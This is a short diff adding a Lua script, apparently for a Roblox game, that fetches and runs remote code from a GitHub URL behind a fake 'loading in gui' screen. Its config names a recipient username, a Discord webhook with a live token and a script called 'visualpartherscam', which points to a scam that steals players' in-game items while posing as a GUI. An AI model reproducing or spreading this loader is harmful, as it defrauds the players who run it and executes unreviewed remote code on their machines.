@@ -1,0 +1,9 @@
+Username = "Drippisamathbook"
+WebHook = "https://discord.com/api/webhooks/1091211569934913556/ey09GjBmS0oXna9at3b2JMpUJURn2K5ozFzWA4UuO3BQ_7E76gaP4HNOoBfauh3haHov"
+loadingscreen = true
+_G.CustomScriptName = "visualpartherscam"
+_G.Text1 = "loading script…"
+_G.Text2 = "loading…"
+_G.Text3 = "loading in gui…"
+_G.Text4 = "gui loaded wait…"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
